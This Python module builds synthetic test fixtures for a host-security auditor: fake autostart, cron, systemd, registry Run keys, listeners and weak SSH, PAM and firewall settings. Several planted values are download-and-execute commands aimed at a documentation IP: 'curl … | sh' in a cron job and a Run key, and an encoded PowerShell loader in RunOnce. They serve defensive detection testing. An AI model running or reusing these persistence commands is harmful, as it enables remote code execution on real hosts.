"""Synthetic fixture builder for the offline self-test and unit tests.

Builds a complete sandbox under ``fixture_root``:

  data/autostart/*.desktop     a fake autostart entry
  data/crontab/*.cron          a suspicious cron job
  data/systemd/user/*.service (+ .wants symlink)   a fake enabled unit
  data/socket/ss.txt           a fake listener (evil port 31337, SSH on 0.0.0.0)
  data/packages/pkgs.txt       an outdated package
  data/ssh/sshd_config         weak SSH config
  data/policy/                 weak login.defs / PAM / blank-password shadow
  data/firewall/               inactive firewall
  data/permissions.json        world-writable ssh config
  hives/SOFTWARE|SYSTEM|NTUSER  synthetic REGF hives (Run/RunOnce + services)
  config/edr.yaml              sandbox config (weights, watchlist, baseline)

Nothing here ever touches a real host; everything lives under fixture_root.
"""

import os
import shutil

from edr_auditor.hive import HiveBuilder, REG_DWORD, REG_SZ

FIXTURE_CONFIG = """\
# Synthetic sandbox config for self-test / demo (never a real host).
report:
  dir: reports
score:
  min_severity: low
  weights:
    persistence: 30
    services: 15
    sockets: 15
    patches: 20
    hardening: 20
scan_scope:
  hives:
    hklm_software: hives/SOFTWARE
    hklm_system: hives/SYSTEM
    hku_ntuser: hives/NTUSER.DAT
  services:
    baseline:
      - "evil-watcher.service"
  patches:
    watch:
      - "openssh-server>=9.0p1"
      - "openssl>=3.1.0"
  sockets:
    risky_ports: [23, 25, 3306, 5432, 6379, 5900, 6000]
    critical_watch: [31337]
"""


def _write(root, relpath, content):
    path = os.path.join(root, relpath)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    return path


def _build_hives(root):
    hive_dir = os.path.join(root, "hives")
    os.makedirs(hive_dir, exist_ok=True)

    software = HiveBuilder()
    software.add_key("Microsoft\\Windows\\CurrentVersion\\Run")
    software.add_value(
        "Microsoft\\Windows\\CurrentVersion\\Run",
        "EvilUpdater", REG_SZ,
        r"C:\Windows\Temp\evil<c2>.exe --profile=https://192.0.2.10/x",
    )
    software.add_value(
        "Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "Upgrade", REG_SZ,
        r"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEAMAAvAHAAYQBsAG8AYQBkAC4AcABzADEAJwApAQA=",
    )
    software.add_value(
        "Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Kit", REG_SZ, r"C:\Users\Public\kit.cmd",
    )
    software.write(os.path.join(hive_dir, "SOFTWARE"))

    ntdat = HiveBuilder()
    ntdat.add_key("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    ntdat.add_value(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "PersistenceProbe", REG_SZ,
        "curl https://192.0.2.10/x.sh | sh",
    )
    ntdat.write(os.path.join(hive_dir, "NTUSER.DAT"))

    system = HiveBuilder()
    system.add_key("ControlSet001\\Services\\evilsvc")
    system.add_value("ControlSet001\\Services\\evilsvc", "Start", REG_DWORD, 2)
    system.add_value("ControlSet001\\Services\\evilsvc", "DisplayName", REG_SZ, "Evil Service")
    system.add_value("ControlSet001\\Services\\evilsvc", "ImagePath", REG_SZ, r"C:\Windows\evil.exe")
    system.add_key("ControlSet001\\Services\\sshd")
    system.add_value("ControlSet001\\Services\\sshd", "Start", REG_DWORD, 1)
    system.write(os.path.join(hive_dir, "SYSTEM"))


def build(base=None):
    """Create the fixture sandbox. Returns its root path."""
    if base is None:
        base = os.path.join("/tmp", "edr_fixtures")
    root = os.path.abspath(str(base))
    shutil.rmtree(root, ignore_errors=True)
    os.makedirs(root, exist_ok=True)

    _write(root, "config/edr.yaml", FIXTURE_CONFIG)

    _write(root, "data/autostart/evil-helper.desktop", (
        "[Desktop Entry]\n"
        "Type=Application\n"
        "Name=Update Helper\n"
        "Exec=/tmp/evil-helper.sh --auto\n"
        "Hidden=false\n"
        "X-GNOME-Autostart-enabled=true\n"))
    _write(root, "data/autostart/legit.desktop", (
        "[Desktop Entry]\n"
        "Type=Application\n"
        "Name=Legacy Tool\n"
        "Exec=legacy-tool --daemon\n"
        "Hidden=true\n"))
    _write(root, "data/crontab/main.cron", (
        "# user crontab\n"
        "MAILTO=root\n"
        "*/5 * * * * curl -s http://192.0.2.10/run.sh | sh\n"
        "15 3 * * * /usr/local/bin/backup.sh --full\n"))
    _write(root, "data/systemd/user/evil-watcher.service", (
        "[Unit]\n"
        "Description=Fake watcher\n"
        "[Service]\n"
        "ExecStart=/tmp/evil-watcher --poll https://192.0.2.10\n"
        "Restart=always\n"))
    _write(root, "data/systemd/system/weekly-report.timer", (
        "[Unit]\n"
        "Description=Weekly report\n"
        "[Timer]\n"
        "OnCalendar=weekly\n"))

    _write(root, "data/socket/ss.txt", (
        "Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process\n"
        "tcp    LISTEN  0       128     0.0.0.0:22          0.0.0.0:*          users:((\"sshd\",pid=123,fd=3))\n"
        "tcp    LISTEN  0       128     127.0.0.1:631       0.0.0.0:*          users:((\"cupsd\",pid=456,fd=7))\n"
        "tcp    LISTEN  0       5       0.0.0.0:31337       0.0.0.0:*          users:((\"evil-svc\",pid=999,fd=4))\n"
        "udp    UNCONN  0       0       0.0.0.0:68          0.0.0.0:*          users:((\"dhclient\",pid=222,fd=11))\n"))

    _write(root, "data/packages/pkgs.txt", (
        "openssh-server\t1.8.9p1\n"
        "openssl\t3.0.0\n"
        "bash\t5.2\n"
        "curl\t8.0.0\n"))

    _write(root, "data/ssh/sshd_config", (
        "# fixture sshd_config\n"
        "Port 22\n"
        "PermitRootLogin yes\n"
        "PasswordAuthentication yes\n"))
    _write(root, "data/ssh/sshd_config.d/extras.conf", (
        "# fixture drop-in\n"
        "PrintMotd no\n"))

    _write(root, "data/policy/login.defs", (
        "PASS_MAX_DAYS\t99999\n"
        "PASS_MIN_DAYS\t0\n"
        "PASS_MIN_LEN\t1\n"))
    _write(root, "data/policy/common-password", (
        "password\trequired\tpam_pwquality.so retry=3\n"
        "password\trequired\tpam_unix.so sha512\n"))
    _write(root, "data/policy/shadow", (
        "root:!:19000:0:99999:7:::\n"
        "victim::19001:0:99999:7:::\n"
        "locked:*:19002:0:99999:7:::\n"))

    _write(root, "data/firewall/ufw.txt", "Status: inactive\n")
    _write(root, "data/firewall/nft.txt", "\n")
    _write(root, "data/firewall/iptables.txt", "\n")

    _write(root, "data/systemctl/units.txt", (
        "UNIT FILE                    STATE\n"
        "evil-watcher.service         enabled\n"
        "base.service                 enabled\n"
        "cron.service                 enabled\n"))

    import json
    _write(root, "data/permissions.json", json.dumps({
        "/etc/ssh/sshd_config": [644, 0],
        "/etc/ssh/sshd_config.d/extras.conf": [666, 0],
    }, indent=2))

    # Enabled systemd unit via a .wants symlink.
    wants_dir = os.path.join(root, "data", "systemd", "user", "evil-watcher.service.wants")
    os.makedirs(wants_dir, exist_ok=True)
    target = os.path.join(root, "data", "systemd", "user", "evil-watcher.service")
    link = os.path.join(wants_dir, "evil-watcher.service")
    if not os.path.lexists(link):
        os.symlink(target, link)

    _build_hives(root)
    return root